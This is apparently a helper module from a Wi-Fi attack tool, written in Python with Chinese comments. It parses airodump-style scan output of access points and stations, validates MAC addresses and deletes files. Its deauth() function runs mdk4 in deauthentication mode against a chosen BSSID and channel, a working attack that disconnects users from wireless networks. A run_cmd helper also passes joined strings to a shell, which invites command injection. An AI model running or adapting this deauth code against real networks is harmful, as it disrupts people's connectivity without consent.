#!/usr/bin/env python
# -*- coding: utf-8
import os
import re
import linecache
import subprocess
import time
from threading import Thread


#执行命令
def run_cmd(command_list):
    command = ' '.join(command_list)
    ret = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="utf-8",
                         timeout=1)
    if ret.returncode == 0:
        return ret.stdout
    else:
        print(ret.stderr)
        return False


#文件解析
def file_parse(file):
    inputfile = file  ## 输入源文件
    fp = open(inputfile, 'r')
    keyword = 'Station'  ## 切分的关键字
    count = 1

    for each_line in fp:
        m = re.search(keyword, each_line)  ## 查询关键字
        if m is not None:
            key_number = count  # 将关键字的行号
        count += 1

    line_numbers = count + 1  # 文件总行数

    wifi_lines = linecache.getlines(inputfile)[2:key_number - 1]
    station_lines = linecache.getlines(inputfile)[key_number:line_numbers]
    fp.close()

    return (wifi_lines, station_lines)


"""列表对比输出"""
def get_append(oldlist,newlist):

    append = [x for x in newlist if x not in oldlist]
    return append

"""字典集转列表"""
def get_dictkey_list(list_name,**kargs):

    temp_list = []
    for temp in list_name:
        temp_value = ''
        for key in kargs:
            temp_value = temp_value+str(temp[key])
        temp_list.append(
            temp_value
        )

    return temp_list


def is_null(value):
    if value == '':
        return None
    else:
        return value


def validate_mac(value):
    # if value.find('-') != -1:
    #     pattern = re.compile(r"^\s*([0-9a-fA-F]{2,2}-){5,5}[0-9a-fA-F]{2,2}\s*$")
    #     if pattern.match(value):
    #         return True
    #     else:
    #         return False
    if value.find(':') != -1:
        pattern = re.compile(r"^\s*([0-9a-fA-F]{2,2}:){5,5}[0-9a-fA-F]{2,2}\s*$")
        if pattern.match(value):
            return True
        else:
            return False


def remove_files(file):
    """删除目录下有关键词文件"""
    for temp in os.listdir('.'):
        if file in temp:
            os.remove(temp)


def myasync(f):
    def wrapper(*args, **kwargs):
        thr = Thread(target=f, args=args, kwargs=kwargs)
        thr.start()
    return wrapper


@myasync
def func_A():
    print("字符串1")
    time.sleep(5)
    print("字符串2")


def func_B():
    print("字符串3")


#@myasync
def deauth(ATKFACE, bssid, channel):
    # Deauth
    try:
        process = subprocess.Popen([
            "mdk4",
            ATKFACE,
            "d",
            "-s",
            "20",
            "-c",
            channel,
            "-B",
            bssid
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        return process

    except Exception as e:
        print(e)


if __name__ == "__main__":
    pass

